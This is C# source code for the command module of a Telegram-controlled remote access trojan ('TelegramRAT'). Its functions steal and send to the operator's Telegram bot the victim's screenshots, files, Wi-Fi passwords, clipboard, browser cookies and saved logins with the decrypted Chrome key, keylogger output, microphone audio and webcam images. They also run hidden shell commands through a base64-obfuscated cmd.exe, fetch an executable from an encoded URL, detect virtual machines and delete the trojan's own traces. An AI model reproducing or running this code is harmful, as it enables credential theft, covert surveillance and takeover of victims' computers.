using Microsoft.Win32;
using SimpleJSON;
using System;
using System.Management;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Security.Principal;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace TelegramRAT
{
    class Actions
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);


        public static void PopUp(TelegramAPI tg, string text)
        {
            MessageBox.Show(text, "Telegram RAT");
            tg.SendMessage("Pop-up displayed");
        }

        public static void IPInfo(TelegramAPI tg)
        {
            string url = @"http://ip-api.com/json/?fields=139993";
            JSONNode json;
            try
            {
                HttpClient client = new HttpClient();
                string response = client.GetStringAsync(url).Result;
                json = JSON.Parse(response);
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occurred trying to fetch IP information: " + ex.Message);
                return;
            }

            tg.SendMessage(
                "\nIP: " + json["query"] +
                "\nCountry: " + json["country"] +
                "\nCity: " + json["city"] +
                "\nRegion: " + json["regionName"] +
                "\nLatitude: " + json["lat"] +
                "\nLongitude: " + json["lon"] +
                "\nProxy/VPN/TOR: " + json["proxy"] +
                "\nISP: " + json["isp"]);
        }
        public static void TakeScreenshot(TelegramAPI tg)
        {
            string fileName = (tg.GetID() + " " + DateTime.Now.ToString("s") + ".png").Replace(':', '.');
            try
            {
                Bitmap screenshot = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height, PixelFormat.Format32bppArgb);
                Graphics screenGraph = Graphics.FromImage(screenshot);
                screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, SystemInformation.VirtualScreen.Size, CopyPixelOperation.SourceCopy);
                screenshot.Save(fileName, ImageFormat.Png);
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occurred trying to take a screenshot: " + ex.Message);
                return;
            }

            tg.SendMessage("Sending screenshot...");
            tg.SendFile(fileName);
            File.Delete(fileName);
        }

        public static void UploadFile(TelegramAPI tg, string file)
        {
            // Si el pathname incluye 'username', lo reemplazo por el nombre del usuario actual
            if (file.Contains("username"))
                file = file.Replace("username", Environment.UserName);
            // Me fijo si es un archivo o un directorio
            if (File.Exists(file))
            {
                FileInfo fileInfo  = new FileInfo(file);
                string zipTempFile = String.Empty;
                // Si el archivo es muy grande, lo comprimo y veo si puedo enviarlo
                if (fileInfo.Length > Config.maxFileSize)
                {
                    string zfile = fileInfo.Name + ".zip";
                    zipTempFile = Environment.GetEnvironmentVariable("temp") + "\\" + zfile;
                    try
                    {
                        using (ZipArchive zip = ZipFile.Open(zipTempFile, ZipArchiveMode.Create))
                            zip.CreateEntryFromFile(file, file);
                    }
                    catch (Exception ex)
                    {
                        tg.SendMessage("An error has occurred trying to compress file " + fileInfo.Name + ": " + ex.Message);
                        return;
                    }
                    FileInfo zipFileInfo = new FileInfo(zipTempFile);
                    // El archivo es demasiado grande, incluso comprimido
                    if (zipFileInfo.Length > Config.maxFileSize)
                    {
                        tg.SendMessage("The file size is too big!");
                        File.Delete(zipTempFile);
                        return;
                    }
                }
                tg.SendMessage("Sending file...");
                if (zipTempFile == String.Empty)
                {
                    tg.SendFile(file);
                }
                else
                {
                    tg.SendFile(zipTempFile);
                    File.Delete(zipTempFile);
                }
            } else if (Directory.Exists(file))
            {
                string zDir = file + ".zip";
                try
                {
                    ZipFile.CreateFromDirectory(file, zDir);
                }
                catch (Exception ex)
                {
                    tg.SendMessage("An error occurred trying to compress the directory " + file + ": " + ex.Message);
                    return;
                }
                FileInfo zipDirInfo = new FileInfo(zDir);
                if (zipDirInfo.Length > Config.maxFileSize)
                {
                    tg.SendMessage("The directory is too big!");
                }
                else
                {
                    tg.SendMessage("Sending directory...");
                    tg.SendFile(zDir);
                }
                // Borro el archivo para no dejar rastros
                File.Delete(zDir);
            }
            else
            {
                tg.SendMessage("The file or directory indicated does not exist");
            }
        }

        public static void WaitForDownload(TelegramAPI tg, string filePath)
        {
            if (string.IsNullOrEmpty(Path.GetExtension(filePath)))
            {
                tg.SendMessage("You must specify the file name!");
                return;
            }
            tg.waitingForFile = true;
            // If the path name includes 'username', it is replaced by the local user name
            if (filePath.Contains("username"))
                filePath = filePath.Replace("username", Environment.UserName);
            tg.downloadFilePath = filePath;
            tg.SendMessage("Esperando archivo...");
        }

        public static async void DownloadFile(TelegramAPI tg, string telegramFilePath)
        {
            tg.SendMessage("Descargando archivo...");
            string url = "https://api.telegram.org/file/bot" + Config.TelegramBot_Token + "/" + telegramFilePath;
            // The same client as tg could be used, but we would be breaking encapsulation
            HttpClient client = new HttpClient();
            try
            {
                var response = await client.GetAsync(url);
                using (FileStream fs = new FileStream(tg.downloadFilePath, FileMode.CreateNew))
                {
                    await response.Content.CopyToAsync(fs);
                }
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error has occurred trying to download the file: " + ex.Message);
                return;
            }

            tg.waitingForFile = false;
            tg.SendMessage("File downloaded");
        }
        public static void Exec(TelegramAPI tg, string commands)
        {
            string cmd_command = "/c " + commands;
            // Create child process
            Process p = new Process();
            // Redirect child process' exit
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.FileName = Encoding.UTF8.GetString(Convert.FromBase64String("Y21kLmV4ZQ=="));
            p.StartInfo.Arguments = cmd_command;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            string stdout;
            string stderr;
            int code;
            try
            {
                p.Start();
                stdout = p.StandardOutput.ReadToEnd();
                stderr = p.StandardError.ReadToEnd();
                code = p.ExitCode;
                p.WaitForExit();
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error has occured trying to execute the command: " + ex.Message);
                return;
            }

            tg.SendMessage(
                "Command output:" +
                    "\n[STDOUT]:" +
                    $"\n{stdout}" +
                    "\n[STDERR]:" +
                    $"\n{stderr}" +
                    $"\n[CODE]: {code}"
            );
        }

        public static void ListDrives(TelegramAPI tg)
        {
            string drivesInfo = String.Empty;
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();

                foreach (DriveInfo drive in drives)
                {
                    drivesInfo += Environment.NewLine + "Drive " + drive.Name;
                    drivesInfo += Environment.NewLine + "   Drive type: " + drive.DriveType;
                    if (drive.IsReady)
                    {
                        drivesInfo += Environment.NewLine + "   File system: " + drive.DriveFormat;
                        drivesInfo += Environment.NewLine + "   Disk size available to user: " + (drive.AvailableFreeSpace / Math.Pow(2, 30)) + " GB";
                        drivesInfo += Environment.NewLine + "   Total size: " + (drive.TotalSize / Math.Pow(2, 30)) + " GB";
                    }
                }
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error has occurred trying to fetch drives information: " + ex.Message);
                return;
            }

            tg.SendMessage(drivesInfo);
        }

        public static void GetWifiProfilesAndPasswords(TelegramAPI tg)
        {
            string arguments = "wlan show profile";
            string wifiProfiles = RunNetsh(tg, arguments);

            // Si está en blanco, hubo un error al correr netsh.exe
            if (wifiProfiles == String.Empty)
                return;

            string pattern = @"All User Profile * : (?<SSID>.*)";
            string groupName = "SSID";
            List<string> SSIDs = RegexSearch(wifiProfiles, pattern, groupName);

            string wifiProfilesAndPasswords = "WiFi profiles" + Environment.NewLine;
            foreach (string SSID in SSIDs)
            {
                string password = GetSSIDPassword(tg, SSID);
                wifiProfilesAndPasswords += SSID + ": " + password + Environment.NewLine;
            }

            tg.SendMessage(wifiProfilesAndPasswords);
        }

        private static string GetSSIDPassword(TelegramAPI tg, string SSID)
        {
            string arguments = "wlan show profile name=\"" + SSID + "\" key=clear";
            string profileInformation = RunNetsh(tg, arguments);

            if (profileInformation == String.Empty)
            {
                return "Unable to get profile information";
            }

            string pattern = @"Key Content * : (?<password>.*)";
            string groupName = "password";
            List<string> passwords = RegexSearch(profileInformation, pattern, groupName);
            if (passwords.Count > 0)
            {
                return passwords.First();
            }
            else
            {
                return "Open Network";
            }
        }

        private static string RunNetsh(TelegramAPI tg, string arguments)
        {
            Process netsh = new Process();
            netsh.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            netsh.StartInfo.FileName  = "netsh";
            netsh.StartInfo.Arguments = arguments;

            netsh.StartInfo.UseShellExecute = false;
            netsh.StartInfo.CreateNoWindow = true;
            netsh.StartInfo.RedirectStandardError = true;
            netsh.StartInfo.RedirectStandardOutput = true;
            string output;
            string err;
            int code;
            try
            {
                netsh.Start();
                output = netsh.StandardOutput.ReadToEnd();
                err    = netsh.StandardError.ReadToEnd();
                code   = netsh.ExitCode;
                netsh.WaitForExit();
            }
            catch (Exception ex)
            {
                tg.SendMessage("An exception occurred trying to run netsh: " + ex.Message);
                return String.Empty;
            }
            if (code > 0)
            {
                tg.SendMessage("An error occured while running netsh: " + output);
                return String.Empty;
            }
            return output;
        }

        private static List<string> RegexSearch(string text, string pattern, string groupName)
        {
            List<string> matches = new List<string>();
            using (StringReader reader = new StringReader(text))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    Regex regular_expression = new Regex(pattern);
                    Match patternMatch = regular_expression.Match(line);

                    if (patternMatch.Success)
                    {
                        matches.Add(patternMatch.Groups[groupName].Value);
                    }
                }
            }
            return matches;
        } 

        public static void GetClipboard(TelegramAPI tg)
        {
            string clipboardData = "Clipboard data:" + Environment.NewLine;
            Thread STAThread = new Thread(
                delegate ()
                {
                    clipboardData += Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            tg.SendMessage(clipboardData);
        }

        public static void RemoveSelf(TelegramAPI tg)
        {
            tg.SendMessage("Self-destruction in 3... 2... 1...");
            string installedDir = Path.GetDirectoryName(Environment.ExpandEnvironmentVariables(Config.installPath));
            string installedFile = Environment.ExpandEnvironmentVariables(Config.installPath);
            string startupDir = Environment.ExpandEnvironmentVariables(Config.startupPath);
            string deleteCommand = "/c choice /C Y /N /D Y /T 3 & del " + Application.ExecutablePath;
            if (File.Exists(startupDir))
            {
                deleteCommand += " & del /f /q \"" + startupDir + "\"";
            }
            if (Directory.Exists(installedDir))
            {
                deleteCommand += " & del /a:h /f /q /s \"" + installedFile + "\"";
                deleteCommand += " & rmdir /s /q \"" + installedDir + "\"";
            }
            Process selfDestruct = new Process();
            selfDestruct.StartInfo.UseShellExecute = false;
            selfDestruct.StartInfo.RedirectStandardOutput = true;
            selfDestruct.StartInfo.RedirectStandardError = true;
            selfDestruct.StartInfo.FileName = Encoding.UTF8.GetString(Convert.FromBase64String("Y21kLmV4ZQ=="));
            selfDestruct.StartInfo.Arguments = deleteCommand;
            selfDestruct.StartInfo.CreateNoWindow = true;
            selfDestruct.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            selfDestruct.Start();
            Environment.Exit(1);
        }

        public static void ListDirs(TelegramAPI tg, string path)
        {
            if (path.Contains("username"))
                path = path.Replace("username", Environment.UserName);

            if (!Directory.Exists(path))
            {
                tg.SendMessage("The directory does not exist!");
                return;
            }

            string[] dirs = Directory.GetDirectories(path);
            string message = Environment.NewLine + string.Join(Environment.NewLine, dirs);
            tg.SendMessage(message);
        }

        public static void ListFiles(TelegramAPI tg, string path)
        {
            if (path.Contains("username"))
                path = path.Replace("username", Environment.UserName);

            if (!Directory.Exists(path))
            {
                tg.SendMessage("The directory does not exist!");
                return;
            }

            string[] files = Directory.GetFiles(path);
            string message = Environment.NewLine + string.Join(Environment.NewLine, files);
            tg.SendMessage(message);
        }

        public static Process StartProcess(TelegramAPI tg, string programFile, string parameters, bool isHidden)
        {
            Process process = new Process();
            try
            {
        
                ProcessStartInfo startInfo = new ProcessStartInfo();
                if (isHidden)
                {
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                }

                startInfo.FileName = programFile;
                startInfo.Arguments = parameters;
                process.StartInfo = startInfo;
                process.Start();
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error has occurred running the program " + programFile + ": " + ex.Message);
                return process;
            }

            tg.SendMessage("The program " + programFile + " was executed correctly");
            return process;
        }
        public static void SystemInfo(TelegramAPI tg){
            tg.SendMessage(
                "\nOperating system: " + GetSystemVersion() +
                "\nComputer name: " + Environment.MachineName +
                "\nUser name: " + Environment.UserName +
                "\nDate and time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                "\nIs admin: " + IsAdministrator() +
                "\nCPU: " + GetCPUName() +
                "\nGPU: " + GetGPUName() +
                "\nRAM: " + GetRamAmount() + "MB" +
                "\nHWID: " + GetHWID() +
                "\nIs running on a VM: " + InVM() +
            "");
        }

        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }


        public static string GetCPUName(){
            return GetResource("SELECT * FROM Win32_Processor", "Name");
        }

        public static string GetGPUName(){
            return GetResource("SELECT * FROM Win32_VideoController", "Name");
        }

        public static string GetHWID()
        {
            return GetResource("SELECT ProcessorId FROM Win32_Processor", "ProcessorId");
        }

        public static string GetResource(string query, string field)
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", query);
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject[field].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        public static int GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount;
            }
            catch
            {
                return -1;
            }
        }


        public static string GetSystemVersion()
        {
            return (GetWindowsVersionName() + " " + GetWindowsBuild() + " " + GetBitVersion());
        }

        private static string GetWindowsBuild()
        {
            return Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("CurrentBuild").ToString();
        }

        private static string GetWindowsVersionName()
        {
            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem")) {
                string sData = string.Empty;
                foreach (ManagementObject tObj in mSearcher.Get())
                {
                    sData = Convert.ToString(tObj["Name"]);
                }
                try {
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
                catch { sData = "Unknown System"; }
                return sData;
            }
        }

        private static string GetBitVersion()
        {
            if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
            {
                return "(32 Bit)";
            }
            else
            {
                return "(64 Bit)";
            }
        }


        public static void GetInstalledApps(TelegramAPI tg)
        {
            string apps = String.Empty;

            try
            {
                // CurrentUser
                apps += "\nCurrentUser";
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                apps += key is null ? "\nKey not found." : PrintNames(key);

                // LocalMachine_32
                apps += "\n\nLocalMachine32";
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                apps += key is null ? "\nKey not found." : PrintNames(key);

                // LocalMachine_64
                apps += "\n\nLocalMachine64";
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall");
                apps += key is null ? "\nKey not found." : PrintNames(key);
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occurred trying to get the installed apps: " + ex.Message);
                return;
            }

            tg.SendMessage(apps);
        }

        private static string PrintNames(RegistryKey key)
        {
            string output = String.Empty;
            foreach (string keyName in key.GetSubKeyNames())
            {
                RegistryKey subkey = key.OpenSubKey(keyName);
                string displayName = (string)subkey.GetValue("DisplayName");
                string displayVersion = (string)subkey.GetValue("DisplayVersion");
                if (string.IsNullOrEmpty(displayName))
                    continue;
                output += "\n-" + displayName + ": " + displayVersion;
            }
            return string.IsNullOrEmpty(output) ? "\n(empty)" : output;
        }

        public static void GetCookies(TelegramAPI tg)
        {
            try
            {
                GetChromeFile(tg, "Cookies");
                GetFirefoxFile(tg, "cookies.sqlite");
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occurred trying to get the cookies: " + ex.Message);
                return;
            }
        }

        private static void GetChromeFile(TelegramAPI tg, string file)
        {
            string cookies = Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Default\\" + file);
            if (File.Exists(cookies))
            {
                string chromeKey = GetChromeDecryptedKey(tg);
                tg.SendMessage("Chrome key=" + chromeKey);
                tg.SendFile(cookies);
            } else
            {
                tg.SendMessage(file + " could not be found in Chrome");
            }
        }

        private static string GetChromeDecryptedKey(TelegramAPI tg)
        {
            try
            {
                string path = Environment.ExpandEnvironmentVariables("%LocalAppData%\\Google\\Chrome\\User Data\\Local State");
                string text = File.ReadAllText(path);

                int start = text.IndexOf("\"encrypted_key\"") + 17;
                text = text.Substring(start);
                int end = text.IndexOf('\"');
                text = text.Substring(0, end);

                var decodedKey = ProtectedData.Unprotect(Convert.FromBase64String(text).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
                string key = Convert.ToBase64String(decodedKey);
                return key;
            }
            catch (Exception ex)
            {
                tg.SendMessage(ex.Message);
                return "Unable to decrypt user password";
            }
        }

        private static void GetFirefoxFile(TelegramAPI tg, string file)
        {
            string profilePath = Environment.ExpandEnvironmentVariables("%AppData%\\Mozilla\\Firefox\\Profiles");

            if (Directory.Exists(profilePath))
            {
                string[] profiles = Directory.GetDirectories(profilePath);

                if (profiles.Length == 0)
                {
                    tg.SendMessage("No profiles for Firefox were found");
                    return;
                }
                foreach (string profile in profiles) {
                    string cookies = profile + "\\" + file;
                    if (File.Exists(cookies))
                    {
                        tg.SendFile(cookies);
                    }
                }
            } else
            {
                    tg.SendMessage("No profiles for Firefox were found");
            }
        }

        public static void GetWebLogins(TelegramAPI tg)
        {
            try
            {
                GetChromeFile(tg, "Login Data");
                GetFirefoxFile(tg, "logins.json");
                GetFirefoxFile(tg, "key4.db");
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occurred while trying to get the cookies: " + ex.Message);
                return;
            }
        }

        public static void RetrieveLog(TelegramAPI tg)
        {
            UnicodeEncoding uniEncoding = new UnicodeEncoding();
            string keylogsFile = Path.GetDirectoryName(KeyLogger.loggerPath) + "\\Keylog.txt";

            try
            {
                using (MemoryStream memStream = new MemoryStream(KeyLogger.keyLog, 0, KeyLogger.currentPosition))
                {
                    byte[] logBytes = new byte[memStream.Length];
                    int count = 0;
                    while (count < memStream.Length)
                    {
                        logBytes[count++] = Convert.ToByte(memStream.ReadByte());
                    }
                    char[] logChars = new char[uniEncoding.GetCharCount(logBytes, 0, count)];
                    uniEncoding.GetDecoder().GetChars(logBytes, 0, count, logChars, 0);
                    using (StreamWriter sw = new StreamWriter(keylogsFile))
                    {
                        sw.Write(logChars);
                    }
                }
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error occured trying to read the keylogger's buffer: " + ex.Message);
                return;
            }
            KeyLogger.currentPosition = 0;

            Actions.UploadFile(tg, keylogsFile);
            File.Delete(keylogsFile);
        }


        public static void RecordMicrophone(TelegramAPI tg)
        {
            bool prev = false;
            string filename = Environment.GetEnvironmentVariable("temp") + "\\recording.wav";
            while (true)
            {
                try
                {
                    Thread.Sleep(Timeout.Infinite);
                }
                catch (ThreadInterruptedException)
                {

                }
                if (tg.GetRecordingStatus() ^ prev)  //cambió el estado de la grabacion
                {
                    if (prev) 
                    {
                        try
                        {
                            mciSendString("save recsound " + filename, "", 0, 0);
                            mciSendString("close recsound ", "", 0, 0);
                        }
                        catch (Exception ex)
                        {
                            tg.SendMessage("An error has occurred trying to save the recording: " + ex.Message);
                            continue;
                        }
                        if (File.Exists(filename))
                        {
                            UploadFile(tg, filename);
                            File.Delete(filename);
                        }
                        else
                        {
                            tg.SendMessage("There is no microphone plugged in.");
                        }
                    }
                    else
                    {
                        if (File.Exists(filename))
                        {
                            File.Delete(filename);
                        }
                        try
                        {
                            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                            mciSendString("record recsound", "", 0, 0);
                        }
                        catch (Exception ex)
                        {
                            tg.SendMessage("An error has occurred trying to start the recording: " + ex.Message);
                            continue;
                        }

                        tg.SendMessage("Recording started");
                    }
                    prev = !prev;
                }
            }


        }

        public static void WebcamSnapshot(TelegramAPI tg, string delay, string camera) {
            // Links
            string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
            string commandCamLINK = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RlZGJ1cmtlL0NvbW1hbmRDYW0vbWFzdGVyL0NvbW1hbmRDYW0uZXhl"));
            string filename = Environment.GetEnvironmentVariable("temp") + "\\webcam.png";
            // Veo si hay que descargar CommandCam.exe
            try
            {
                if (!File.Exists(commandCamPATH))
                {
                    tg.SendMessage("Downloading CommandCam");
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile(commandCamLINK, commandCamPATH);
                    tg.SendMessage("CommandCam downloaded");
                }
            }
            catch (Exception ex)
            {
                tg.SendMessage("Unable to download Commandcam: " + ex.Message );
                return;
            }
            tg.SendMessage($"Trying to take snapshot from the camera {camera}.");
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }
            // Take the picture
            Process camProcess = new Process();
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                startInfo.FileName = commandCamPATH;
                startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
                camProcess.StartInfo = startInfo;
                camProcess.Start();
            }
            catch (Exception ex)
            {
                tg.SendMessage("An error has occurred trying to run the webcam recording program: " + ex.Message);
                return;
            }
            camProcess.WaitForExit();

            if (!File.Exists(filename))
            {
                tg.SendMessage("No webcam found or an error occurred trying to run Commandcam.");
                return;
            }

            tg.SendFile(filename);
            File.Delete(filename);
            }

        internal static void Startup(TelegramAPI tg)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_StartupCommand");
            string respuesta = "Command output: \n";
            int i = 0;
            foreach (ManagementObject mo in searcher.Get())
            {
                i++;
                PropertyDataCollection searcherProperties = mo.Properties;
                foreach (PropertyData sp in searcherProperties)
                {
                    if (sp.Name == "Caption")
                    {
                        respuesta = respuesta + "Name: " + sp.Value.ToString() + "\n";
                    }
                    if (sp.Name == "Command")
                    {
                        respuesta = respuesta + "Command: " + sp.Value.ToString() + "\n";
                    }
                }
            }
            tg.SendMessage(respuesta);
        }

        internal static bool InVM()
        {
            return ProcessManager.InVirtualBox();
        }

    }
}
